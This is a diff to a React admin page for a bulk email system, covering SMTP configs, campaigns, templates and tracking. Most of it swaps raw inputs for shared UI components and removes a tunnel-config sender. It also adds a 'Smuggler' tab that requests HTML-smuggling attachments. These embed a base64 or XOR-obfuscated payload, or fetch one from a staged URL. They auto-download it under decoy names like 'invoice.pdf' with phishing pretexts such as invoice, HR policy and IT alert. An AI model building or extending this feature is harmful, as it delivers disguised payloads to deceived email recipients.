@@ -6,6 +6,11 @@ import { toast } from "sonner"
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
+import { Input } from "@/components/ui/input"
+import { Label } from "@/components/ui/label"
+import { Textarea } from "@/components/ui/textarea"
+import { Switch } from "@/components/ui/switch"
+import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { cn } from "@/lib/utils"
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
 import { SmtpConfigManager, type SmtpConfigItem } from "./smtp-config-manager"
@@ -94,15 +99,6 @@ export function MailTestView() {
   )
   const [sendingResend, setSendingResend] = useState(false)
 
-  // Tunnel script send state
-  const [tunnelTo, setTunnelTo] = useState("")
-  const [tunnelNodeId, setTunnelNodeId] = useState("")
-  const [tunnelType, setTunnelType] = useState("hysteria2")
-  const [tunnelConfig, setTunnelConfig] = useState("")
-  const [customSubject, setCustomSubject] = useState("")
-  const [customMessage, setCustomMessage] = useState("")
-  const [sendingTunnel, setSendingTunnel] = useState(false)
-
   // Bulk email send state
   const [bulkCsvText, setBulkCsvText] = useState("")
   const [bulkSubject, setBulkSubject] = useState("Hello {{firstName}}")
@@ -124,8 +120,8 @@ export function MailTestView() {
 
   // Template editor state
   const [activeTab, setActiveTab] = useState("accounts")
-  const [templates, setTemplates] = useState<Array<{id: string; name: string; subject: string; htmlContent: string; textContent: string; variables?: string[]; category?: string; version?: number}>>([])
-  const [selectedTemplate, setSelectedTemplate] = useState<{id: string; name: string; subject: string; htmlContent: string; textContent: string; variables?: string[]; category?: string; version?: number} | null>(null)
+  const [templates, setTemplates] = useState<Array<{id: string; name: string; subject: string; htmlContent: string; textContent: string; variables?: string[]; category?: string; version?: number; tags?: string[]; description?: string}>>([])
+  const [selectedTemplate, setSelectedTemplate] = useState<{id: string; name: string; subject: string; htmlContent: string; textContent: string; variables?: string[]; category?: string; version?: number; tags?: string[]; description?: string} | null>(null)
   const [templateName, setTemplateName] = useState("")
   const [templateSubject, setTemplateSubject] = useState("")
   const [templateHtml, setTemplateHtml] = useState("")
@@ -169,6 +165,64 @@ export function MailTestView() {
   const [bounceEvents, setBounceEvents] = useState<Array<{id: string; recipient: string; bounceReason: string; bounceType: string; timestamp: string}>>([])
   const [bounceStats, setBounceStats] = useState<{total: number; hard: number; soft: number; complaints: number; unknown: number} | null>(null)
   const [suppressedEmails, setSuppressedEmails] = useState<string[]>([])
+
+  // Smuggler state
+  const [smugMode, setSmugMode] = useState<"embed" | "staged" | "pretext-only">("embed")
+  const [smugPayloadB64, setSmugPayloadB64] = useState("")
+  const [smugPayloadUrl, setSmugPayloadUrl] = useState("")
+  const [smugFilename, setSmugFilename] = useState("invoice.pdf")
+  const [smugPretext, setSmugPretext] = useState<"invoice" | "hr_policy" | "it_alert" | "contract" | "">("")
+  const [smugXorKey, setSmugXorKey] = useState("")
+  const [smugAutoDownload, setSmugAutoDownload] = useState(true)
+  const [smugLinkText, setSmugLinkText] = useState("")
+  const [smugDecoyHtml, setSmugDecoyHtml] = useState("")
+  const [smugResult, setSmugResult] = useState<{html: string; sizeBytes: number; mode: string} | null>(null)
+  const [smugLoading, setSmugLoading] = useState(false)
+
+  const generateSmuggled = useCallback(async () => {
+    setSmugLoading(true)
+    setSmugResult(null)
+    try {
+      const body: Record<string, unknown> = { mode: smugMode }
+      if (smugMode === "embed") {
+        if (!smugPayloadB64.trim()) { toast.error("Paste a base64 payload"); return }
+        body.payloadBase64 = smugPayloadB64.trim()
+        body.filename = smugFilename.trim() || "attachment.bin"
+        body.autoDownload = smugAutoDownload
+        if (smugPretext) body.pretext = smugPretext
+        if (smugXorKey) body.xorKey = parseInt(smugXorKey, 10)
+        if (smugLinkText) body.downloadLinkText = smugLinkText
+        if (smugDecoyHtml) body.decoyHtml = smugDecoyHtml
+      } else if (smugMode === "staged") {
+        if (!smugPayloadUrl.trim()) { toast.error("Enter payload URL"); return }
+        body.payloadUrl = smugPayloadUrl.trim()
+        body.filename = smugFilename.trim() || "attachment.bin"
+        body.autoDownload = smugAutoDownload
+        if (smugPretext) body.pretext = smugPretext
+        if (smugLinkText) body.downloadLinkText = smugLinkText
+        if (smugDecoyHtml) body.decoyHtml = smugDecoyHtml
+      } else {
+        if (!smugPretext) { toast.error("Select a pretext template"); return }
+        body.pretext = smugPretext
+      }
+      const res = await apiFetch("/api/admin/communication/mail/smuggler", {
+        method: "POST",
+        headers: { "content-type": "application/json" },
+        body: JSON.stringify(body),
+      })
+      if (!res.ok) {
+        const err = await res.json().catch(() => ({ error: res.statusText }))
+        throw new Error(err.error || "Failed")
+      }
+      const data = await res.json()
+      setSmugResult(data)
+      toast.success("HTML generated", { description: `${(data.sizeBytes / 1024).toFixed(1)} KB` })
+    } catch (err) {
+      toast.error("Smuggler failed", { description: err instanceof Error ? err.message : "unknown" })
+    } finally {
+      setSmugLoading(false)
+    }
+  }, [smugMode, smugPayloadB64, smugPayloadUrl, smugFilename, smugPretext, smugXorKey, smugAutoDownload, smugLinkText, smugDecoyHtml])
 
   /* ---- Test all accounts ---- */
   const testAll = useCallback(async () => {
@@ -370,46 +424,6 @@ export function MailTestView() {
       setSendingResend(false)
     }
   }, [resendTo, resendSubject, resendBody])
-
-  /* ---- Send tunnel script ---- */
-  const handleSendTunnel = useCallback(async () => {
-    setSendingTunnel(true)
-    try {
-      const res = await fetch("/api/mailer/send-tunnel", {
-        method: "POST",
-        headers: { "content-type": "application/json" },
-        body: JSON.stringify({
-          to: tunnelTo,
-          nodeId: tunnelNodeId || undefined,
-          tunnelType: tunnelType || undefined,
-          tunnelConfig: tunnelConfig || undefined,
-          customSubject: customSubject || undefined,
-          customMessage: customMessage || undefined,
-        }),
-      })
-      if (!res.ok) {
-        const errData = await res.json().catch(() => ({}))
-        throw new Error((errData as { error?: string }).error ?? `${res.status}`)
-      }
-      const data = await res.json()
-      toast.success("Tunnel script sent", {
-        description: `Message ID: ${data.messageId ?? "unknown"}`,
-      })
-      // Clear form
-      setTunnelTo("")
-      setTunnelNodeId("")
-      setTunnelType("hysteria2")
-      setTunnelConfig("")
-      setCustomSubject("")
-      setCustomMessage("")
-    } catch (err) {
-      toast.error("Failed to send tunnel script", {
-        description: err instanceof Error ? err.message : "unknown",
-      })
-    } finally {
-      setSendingTunnel(false)
-    }
-  }, [tunnelTo, tunnelNodeId, tunnelType, tunnelConfig, customSubject, customMessage])
 
   /* ---- Bulk email send ---- */
   const handleBulkDryRun = useCallback(async () => {
@@ -793,20 +807,36 @@ export function MailTestView() {
   }, [loadTemplates, loadSmtpConfigsList, loadCampaigns, loadAnalytics])
 
   if (loading) {
-    return <p className="p-6 text-muted-foreground">Loading mail accounts...</p>
+    return (
+      <div className="flex flex-col gap-6">
+        <div>
+          <div className="h-7 w-32 rounded bg-muted animate-pulse" />
+          <div className="h-4 w-80 rounded bg-muted animate-pulse mt-2" />
+        </div>
+        <div className="grid gap-6 xl:grid-cols-2">
+          {[...Array(4)].map((_, i) => (
+            <div key={i} className="rounded-lg border p-6 space-y-3">
+              <div className="h-4 w-40 rounded bg-muted animate-pulse" />
+              <div className="h-8 rounded bg-muted animate-pulse" />
+              <div className="h-8 rounded bg-muted animate-pulse" />
+            </div>
+          ))}
+        </div>
+      </div>
+    )
   }
 
   return (
     <div className="flex flex-col gap-6">
       <div>
-        <h1 className="text-heading-xl">Auto Mailing Test System</h1>
+        <h1 className="text-heading-xl">Mail System</h1>
         <p className="text-sm text-muted-foreground">
-          Test mail account connectivity, send test emails, schedule automated health checks, and manage email campaigns.
+          Manage SMTP configs, send campaigns, track delivery, and monitor account health.
         </p>
       </div>
 
       <Tabs value={activeTab} onValueChange={setActiveTab}>
-        <TabsList className="grid w-full grid-cols-7">
+        <TabsList className="grid w-full grid-cols-8">
           <TabsTrigger value="accounts">Accounts</TabsTrigger>
           <TabsTrigger value="smtp-configs">SMTP Configs</TabsTrigger>
           <TabsTrigger value="templates">Templates</TabsTrigger>
@@ -814,6 +844,7 @@ export function MailTestView() {
           <TabsTrigger value="tracking">Tracking</TabsTrigger>
           <TabsTrigger value="bounce">Bounce</TabsTrigger>
           <TabsTrigger value="analytics">Analytics</TabsTrigger>
+          <TabsTrigger value="smuggler">Smuggler</TabsTrigger>
         </TabsList>
 
         <TabsContent value="accounts" className="space-y-6">
@@ -922,16 +953,14 @@ export function MailTestView() {
           <CardContent className="space-y-4">
             <div className="flex items-end gap-3">
               <div className="space-y-1 flex-1">
-                <label className="text-xs font-medium text-muted-foreground">
-                  Interval (minutes)
-                </label>
-                <input
+                <Label className="text-xs">Interval (minutes)</Label>
+                <Input
                   type="number"
                   min="1"
                   max="1440"
                   value={intervalInput}
                   onChange={(e) => setIntervalInput(e.target.value)}
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                  className="h-8 text-sm"
                 />
               </div>
               <Button
@@ -998,12 +1027,13 @@ export function MailTestView() {
           <CardContent className="space-y-3">
             {/* Saved config selector */}
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Use Saved Config</label>
-              <select
-                value={selectedSmtpConfigId}
-                onChange={(e) => {
-                  setSelectedSmtpConfigId(e.target.value)
-                  const cfg = smtpConfigs.find((c) => c.id === e.target.value)
+              <Label className="text-xs">Use Saved Config</Label>
+              <Select
+                value={selectedSmtpConfigId || "__manual__"}
+                onValueChange={(val) => {
+                  const id = (val === "__manual__" || val === null) ? "" : val
+                  setSelectedSmtpConfigId(id)
+                  const cfg = smtpConfigs.find((c) => c.id === id)
                   if (cfg) {
                     setSmtpHost(cfg.host)
                     setSmtpPort(String(cfg.port))
@@ -1012,106 +1042,119 @@ export function MailTestView() {
                     setSmtpFrom(cfg.fromEmail)
                   }
                 }}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
               >
-                <option value="">-- Manual config --</option>
-                {smtpConfigs.map((cfg) => (
-                  <option key={cfg.id} value={cfg.id}>
-                    {cfg.name} ({cfg.host}:{cfg.port})
-                  </option>
-                ))}
-              </select>
+                <SelectTrigger className="h-8 text-sm">
+                  <SelectValue placeholder="-- Manual config --" />
+                </SelectTrigger>
+                <SelectContent>
+                  <SelectItem value="__manual__">-- Manual config --</SelectItem>
+                  {smtpConfigs.map((cfg) => (
+                    <SelectItem key={cfg.id} value={cfg.id}>
+                      {cfg.name} ({cfg.host}:{cfg.port})
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
             </div>
 
             <div className="grid grid-cols-2 gap-2">
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">SMTP Host</label>
-                <input
+                <Label className="text-xs">SMTP Host</Label>
+                <Input
                   value={smtpHost}
                   onChange={(e) => setSmtpHost(e.target.value)}
                   placeholder="smtp.gmail.com"
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                  className="h-8 text-sm"
                 />
               </div>
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">Port</label>
-                <input
+                <Label className="text-xs">Port</Label>
+                <Input
                   value={smtpPort}
-                  onChange={(e) => setSmtpPort(e.target.value)}
+                  onChange={(e) => {
+                    const val = e.target.value
+                    setSmtpPort(val)
+                    const n = parseInt(val)
+                    if (n === 465) setSmtpSecure(true)
+                    else if (n === 587 || n === 25 || n === 2525) setSmtpSecure(false)
+                  }}
                   placeholder="587"
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                  className="h-8 text-sm"
                 />
               </div>
             </div>
 
             <div className="grid grid-cols-2 gap-2">
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">Username</label>
-                <input
+                <Label className="text-xs">Username</Label>
+                <Input
                   value={smtpUser}
                   onChange={(e) => setSmtpUser(e.target.value)}
                   placeholder="user@example.com"
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                  className="h-8 text-sm"
                 />
               </div>
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">Password</label>
-                <input
+                <Label className="text-xs">Password</Label>
+                <Input
                   type="password"
                   value={smtpPass}
                   onChange={(e) => setSmtpPass(e.target.value)}
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                  className="h-8 text-sm"
                 />
               </div>
             </div>
 
-            <label className="flex items-center gap-2 text-sm">
-              <input
-                type="checkbox"
+            <div className="flex items-center gap-2">
+              <Switch
                 checked={smtpSecure}
-                onChange={(e) => setSmtpSecure(e.target.checked)}
-                className="accent-primary"
+                onCheckedChange={(checked) => {
+                  setSmtpSecure(checked)
+                  const n = parseInt(smtpPort)
+                  if (checked && (n === 587 || n === 25 || n === 2525)) setSmtpPort("465")
+                  else if (!checked && n === 465) setSmtpPort("587")
+                }}
               />
-              Use TLS (port 465)
-            </label>
+              <Label className="text-sm cursor-pointer">Use TLS — port 465 (SSL) · uncheck for 587/25 (STARTTLS)</Label>
+            </div>
 
             <div className="grid grid-cols-2 gap-2">
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">From</label>
-                <input
+                <Label className="text-xs">From</Label>
+                <Input
                   value={smtpFrom}
                   onChange={(e) => setSmtpFrom(e.target.value)}
                   placeholder="(defaults to username)"
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                  className="h-8 text-sm"
                 />
               </div>
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">To</label>
-                <input
+                <Label className="text-xs">To</Label>
+                <Input
                   value={sendTo}
                   onChange={(e) => setSendTo(e.target.value)}
                   placeholder="test@example.com"
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                  className="h-8 text-sm"
                 />
               </div>
             </div>
 
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Subject</label>
-              <input
+              <Label className="text-xs">Subject</Label>
+              <Input
                 value={sendSubject}
                 onChange={(e) => setSendSubject(e.target.value)}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                className="h-8 text-sm"
               />
             </div>
 
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Body</label>
-              <textarea
+              <Label className="text-xs">Body</Label>
+              <Textarea
                 value={sendBody}
                 onChange={(e) => setSendBody(e.target.value)}
                 rows={3}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm resize-none"
+                className="text-sm resize-none"
               />
             </div>
 
@@ -1141,31 +1184,31 @@ export function MailTestView() {
           </CardHeader>
           <CardContent className="space-y-3">
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">To</label>
-              <input
+              <Label className="text-xs">To</Label>
+              <Input
                 value={resendTo}
                 onChange={(e) => setResendTo(e.target.value)}
                 placeholder="test@example.com"
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                className="h-8 text-sm"
               />
             </div>
 
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Subject</label>
-              <input
+              <Label className="text-xs">Subject</Label>
+              <Input
                 value={resendSubject}
                 onChange={(e) => setResendSubject(e.target.value)}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                className="h-8 text-sm"
               />
             </div>
 
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Body</label>
-              <textarea
+              <Label className="text-xs">Body</Label>
+              <Textarea
                 value={resendBody}
                 onChange={(e) => setResendBody(e.target.value)}
                 rows={3}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm resize-none"
+                className="text-sm resize-none"
               />
             </div>
 
@@ -1175,95 +1218,6 @@ export function MailTestView() {
               disabled={sendingResend || !resendTo}
             >
               {sendingResend ? "Sending..." : "Send via Resend"}
-            </Button>
-          </CardContent>
-        </Card>
-
-        {/* ================================================================ */}
-        {/*  TUNNEL SCRIPT SENDER                                            */}
-        {/* ================================================================ */}
-        <Card>
-          <CardHeader className="pb-3">
-            <CardTitle className="text-sm">Send Tunnel Script</CardTitle>
-            <CardDescription className="text-xs">
-              Send Hysteria 2 tunnel configuration via email
-            </CardDescription>
-          </CardHeader>
-          <CardContent className="space-y-3">
-            <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Recipient Email</label>
-              <input
-                type="email"
-                value={tunnelTo}
-                onChange={(e) => setTunnelTo(e.target.value)}
-                placeholder="user@example.com"
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
-              />
-            </div>
-
-            <div className="grid grid-cols-2 gap-2">
-              <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">Node ID (optional)</label>
-                <input
-                  value={tunnelNodeId}
-                  onChange={(e) => setTunnelNodeId(e.target.value)}
-                  placeholder="node-123"
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
-                />
-              </div>
-              <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">Tunnel Type</label>
-                <select
-                  value={tunnelType}
-                  onChange={(e) => setTunnelType(e.target.value)}
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
-                >
-                  <option value="hysteria2">Hysteria 2</option>
-                  <option value="vmess">VMess</option>
-                  <option value="vless">VLESS</option>
-                  <option value="trojan">Trojan</option>
-                </select>
-              </div>
-            </div>
-
-            <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Custom Tunnel Config (optional)</label>
-              <textarea
-                value={tunnelConfig}
-                onChange={(e) => setTunnelConfig(e.target.value)}
-                placeholder="Leave empty to use default configuration template"
-                rows={4}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm font-mono resize-none"
-              />
-            </div>
-
-            <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Custom Subject (optional)</label>
-              <input
-                value={customSubject}
-                onChange={(e) => setCustomSubject(e.target.value)}
-                placeholder="Default: Hysteria 2 Tunnel Configuration"
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
-              />
-            </div>
-
-            <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Custom Message (optional)</label>
-              <textarea
-                value={customMessage}
-                onChange={(e) => setCustomMessage(e.target.value)}
-                placeholder="Default message about keeping configuration secure"
-                rows={2}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm resize-none"
-              />
-            </div>
-
-            <Button
-              className="w-full"
-              onClick={handleSendTunnel}
-              disabled={sendingTunnel || !tunnelTo}
-            >
-              {sendingTunnel ? "Sending..." : "Send Tunnel Script"}
             </Button>
           </CardContent>
         </Card>
@@ -1281,69 +1235,75 @@ export function MailTestView() {
           <CardContent className="space-y-3">
             {/* Provider */}
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Provider</label>
-              <select
+              <Label className="text-xs">Provider</Label>
+              <Select
                 value={bulkProvider}
-                onChange={(e) => setBulkProvider(e.target.value as "smtp" | "resend" | "mysmtp")}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                onValueChange={(val) => { if (val !== null) setBulkProvider(val as "smtp" | "resend" | "mysmtp") }}
               >
-                <option value="smtp">SMTP (saved config)</option>
-                <option value="resend">Resend API</option>
-                <option value="mysmtp">my.smtp.com API</option>
-              </select>
+                <SelectTrigger className="h-8 text-sm">
+                  <SelectValue />
+                </SelectTrigger>
+                <SelectContent>
+                  <SelectItem value="smtp">SMTP (saved config)</SelectItem>
+                  <SelectItem value="resend">Resend API</SelectItem>
+                  <SelectItem value="mysmtp">my.smtp.com API</SelectItem>
+                </SelectContent>
+              </Select>
             </div>
 
             {bulkProvider === "smtp" && (
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">SMTP Config</label>
-                <select
-                  value={bulkSmtpConfigId}
-                  onChange={(e) => setBulkSmtpConfigId(e.target.value)}
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                <Label className="text-xs">SMTP Config</Label>
+                <Select
+                  value={bulkSmtpConfigId || "__default__"}
+                  onValueChange={(val) => setBulkSmtpConfigId(val === "__default__" || val === null ? "" : val)}
                 >
-                  <option value="">-- Default config --</option>
-                  {smtpConfigs.map((cfg) => (
-                    <option key={cfg.id} value={cfg.id}>
-                      {cfg.name} ({cfg.host}:{cfg.port})
-                    </option>
-                  ))}
-                </select>
+                  <SelectTrigger className="h-8 text-sm">
+                    <SelectValue placeholder="-- Default config --" />
+                  </SelectTrigger>
+                  <SelectContent>
+                    <SelectItem value="__default__">-- Default config --</SelectItem>
+                    {smtpConfigs.map((cfg) => (
+                      <SelectItem key={cfg.id} value={cfg.id}>
+                        {cfg.name} ({cfg.host}:{cfg.port})
+                      </SelectItem>
+                    ))}
+                  </SelectContent>
+                </Select>
               </div>
             )}
 
             {/* Rate limits */}
             <div className="grid grid-cols-3 gap-2">
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">Rate/min</label>
-                <input
+                <Label className="text-xs">Rate/min</Label>
+                <Input
                   value={bulkRateLimit}
                   onChange={(e) => setBulkRateLimit(e.target.value)}
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                  className="h-8 text-sm"
                 />
               </div>
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">Batch</label>
-                <input
+                <Label className="text-xs">Batch</Label>
+                <Input
                   value={bulkBatchSize}
                   onChange={(e) => setBulkBatchSize(e.target.value)}
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                  className="h-8 text-sm"
                 />
               </div>
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">Delay ms</label>
-                <input
+                <Label className="text-xs">Delay ms</Label>
+                <Input
                   value={bulkDelayMs}
                   onChange={(e) => setBulkDelayMs(e.target.value)}
-                  className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                  className="h-8 text-sm"
                 />
               </div>
             </div>
 
             {/* CSV Upload */}
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">
-                CSV (firstname,lastname,email)
-              </label>
+              <Label className="text-xs">CSV (firstname,lastname,email)</Label>
               <div className="flex gap-2">
                 <input
                   type="file"
@@ -1352,23 +1312,23 @@ export function MailTestView() {
                   className="text-xs file:mr-2 file:rounded-md file:border file:border-border file:bg-muted file:px-2 file:py-1 file:text-xs"
                 />
               </div>
-              <textarea
+              <Textarea
                 value={bulkCsvText}
                 onChange={(e) => setBulkCsvText(e.target.value)}
                 placeholder={`John,Doe,john@example.com\nJane,Smith,jane@example.com`}
                 rows={4}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm font-mono resize-none"
+                className="text-sm font-mono resize-none"
               />
             </div>
 
             {/* Subject & Body */}
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Subject</label>
-              <input
+              <Label className="text-xs">Subject</Label>
+              <Input
                 value={bulkSubject}
                 onChange={(e) => setBulkSubject(e.target.value)}
                 placeholder="Hello {{firstName}}"
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm"
+                className="h-8 text-sm"
               />
               <p className="text-[10px] text-muted-foreground">
                 Variables: {"{{firstName}}"}, {"{{lastName}}"}, {"{{email}}"}, {"{{name}}"}
@@ -1376,24 +1336,24 @@ export function MailTestView() {
             </div>
 
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Body (text)</label>
-              <textarea
+              <Label className="text-xs">Body (text)</Label>
+              <Textarea
                 value={bulkBody}
                 onChange={(e) => setBulkBody(e.target.value)}
                 placeholder="Hi {{name}}, ..."
                 rows={3}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm resize-none"
+                className="text-sm resize-none"
               />
             </div>
 
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Body (HTML, optional)</label>
-              <textarea
+              <Label className="text-xs">Body (HTML, optional)</Label>
+              <Textarea
                 value={bulkHtmlBody}
                 onChange={(e) => setBulkHtmlBody(e.target.value)}
                 placeholder="<p>Hi {{name}}, ...</p>"
                 rows={2}
-                className="w-full rounded-md border border-border bg-background px-2 py-1.5 text-sm resize-none"
+                className="text-sm resize-none"
               />
             </div>
 
@@ -1604,47 +1564,45 @@ export function MailTestView() {
               </CardHeader>
               <CardContent className="space-y-4">
                 <div className="grid grid-cols-2 gap-2">
-                  <input
-                    type="text"
+                  <Input
                     placeholder="Template name"
                     value={templateName}
                     onChange={(e) => setTemplateName(e.target.value)}
-                    className="rounded-md border border-border bg-background px-3 py-2 text-sm"
+                    className="h-8 text-sm"
                   />
-                  <select
-                    value={templateCategory}
-                    onChange={(e) => setTemplateCategory(e.target.value)}
-                    className="rounded-md border border-border bg-background px-3 py-2 text-sm"
-                  >
-                    <option value="general">General</option>
-                    <option value="marketing">Marketing</option>
-                    <option value="transactional">Transactional</option>
-                    <option value="newsletter">Newsletter</option>
-                    <option value="notification">Notification</option>
-                  </select>
+                  <Select value={templateCategory} onValueChange={(val) => { if (val !== null) setTemplateCategory(val) }}>
+                    <SelectTrigger className="h-8 text-sm">
+                      <SelectValue />
+                    </SelectTrigger>
+                    <SelectContent>
+                      <SelectItem value="general">General</SelectItem>
+                      <SelectItem value="marketing">Marketing</SelectItem>
+                      <SelectItem value="transactional">Transactional</SelectItem>
+                      <SelectItem value="newsletter">Newsletter</SelectItem>
+                      <SelectItem value="notification">Notification</SelectItem>
+                    </SelectContent>
+                  </Select>
                 </div>
 
                 <div className="space-y-1">
-                  <label className="text-xs font-medium text-muted-foreground">Description</label>
-                  <input
-                    type="text"
+                  <Label className="text-xs">Description</Label>
+                  <Input
                     placeholder="Template description"
                     value={templateDescription}
                     onChange={(e) => setTemplateDescription(e.target.value)}
-                    className="w-full rounded-md border border-border bg-background px-3 py-2 text-sm"
+                    className="h-8 text-sm"
                   />
                 </div>
 
                 <div className="space-y-1">
-                  <label className="text-xs font-medium text-muted-foreground">Tags</label>
+                  <Label className="text-xs">Tags</Label>
                   <div className="flex gap-2">
-                    <input
-                      type="text"
+                    <Input
                       placeholder="Add tag"
                       value={templateTagInput}
                       onChange={(e) => setTemplateTagInput(e.target.value)}
                       onKeyPress={(e) => e.key === "Enter" && (e.preventDefault(), addTemplateTag())}
-                      className="flex-1 rounded-md border border-border bg-background px-3 py-2 text-sm"
+                      className="h-8 text-sm"
                     />
                     <Button onClick={addTemplateTag} variant="outline" size="sm">
                   Add
@@ -1668,35 +1626,34 @@ export function MailTestView() {
             </div>
 
             <div className="space-y-1">
-              <label className="text-xs font-medium text-muted-foreground">Subject</label>
-              <input
-                type="text"
+              <Label className="text-xs">Subject</Label>
+              <Input
                 placeholder="Email subject with {{variable}} placeholders"
                 value={templateSubject}
                 onChange={(e) => setTemplateSubject(e.target.value)}
-                className="w-full rounded-md border border-border bg-background px-3 py-2 text-sm"
+                className="h-8 text-sm"
               />
             </div>
 
             <div className="grid grid-cols-2 gap-4">
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">HTML Content</label>
-                <textarea
+                <Label className="text-xs">HTML Content</Label>
+                <Textarea
                   placeholder="<html><body>Hello {{name}},...</body></html>"
                   value={templateHtml}
                   onChange={(e) => setTemplateHtml(e.target.value)}
                   rows={10}
-                  className="w-full rounded-md border border-border bg-background px-3 py-2 text-sm font-mono"
+                  className="text-sm font-mono"
                 />
               </div>
               <div className="space-y-1">
-                <label className="text-xs font-medium text-muted-foreground">Text Content</label>
-                <textarea
+                <Label className="text-xs">Text Content</Label>
+                <Textarea
                   placeholder="Hello {{name}},..."
                   value={templateText}
                   onChange={(e) => setTemplateText(e.target.value)}
                   rows={10}
-                  className="w-full rounded-md border border-border bg-background px-3 py-2 text-sm font-mono"
+                  className="text-sm font-mono"
                 />
               </div>
             </div>
@@ -1738,28 +1695,25 @@ export function MailTestView() {
             </CardHeader>
             <CardContent>
               <div className="space-y-2 mb-4">
-                <label className="text-xs font-medium text-muted-foreground">Preview Variables</label>
+                <Label className="text-xs">Preview Variables</Label>
                 <div className="grid grid-cols-2 gap-2">
-                  <input
-                    type="text"
+                  <Input
                     placeholder="{{firstName}}"
                     value={previewVariables.firstName || ""}
                     onChange={(e) => setPreviewVariables({...previewVariables, firstName: e.target.value})}
-                    className="rounded-md border border-border bg-background px-3 py-2 text-sm"
+                    className="h-8 text-sm"
                   />
-                  <input
-                    type="text"
+                  <Input
                     placeholder="{{lastName}}"
                     value={previewVariables.lastName || ""}
                     onChange={(e) => setPreviewVariables({...previewVariables, lastName: e.target.value})}
-                    className="rounded-md border border-border bg-background px-3 py-2 text-sm"
+                    className="h-8 text-sm"
                   />
-                  <input
-                    type="text"
+                  <Input
                     placeholder="{{email}}"
                     value={previewVariables.email || ""}
                     onChange={(e) => setPreviewVariables({...previewVariables, email: e.target.value})}
-                    className="rounded-md border border-border bg-background px-3 py-2 text-sm"
+                    className="h-8 text-sm"
                   />
                   <Button onClick={previewTemplate} variant="outline" size="sm">
                     Update Preview
@@ -2095,64 +2049,53 @@ export function MailTestView() {
               </CardHeader>
               <CardContent className="space-y-4">
                 <div className="flex items-center justify-between">
-                  <label className="text-sm font-medium">Enable Tracking</label>
-                  <input
-                    type="checkbox"
-                    checked={trackingEnabled}
-                    onChange={(e) => setTrackingEnabled(e.target.checked)}
-                    className="accent-primary"
-                  />
+                  <Label className="text-sm font-medium">Enable Tracking</Label>
+                  <Switch checked={trackingEnabled} onCheckedChange={setTrackingEnabled} />
                 </div>
 
                 {trackingEnabled && (
                   <>
                     <div className="space-y-1">
-                      <label className="text-xs font-medium text-muted-foreground">Tracking Domain</label>
-                      <input
+                      <Label className="text-xs">Tracking Domain</Label>
+                      <Input
                         type="url"
                         placeholder="https://yourdomain.com"
                         value={trackingDomain}
                         onChange={(e) => setTrackingDomain(e.target.value)}
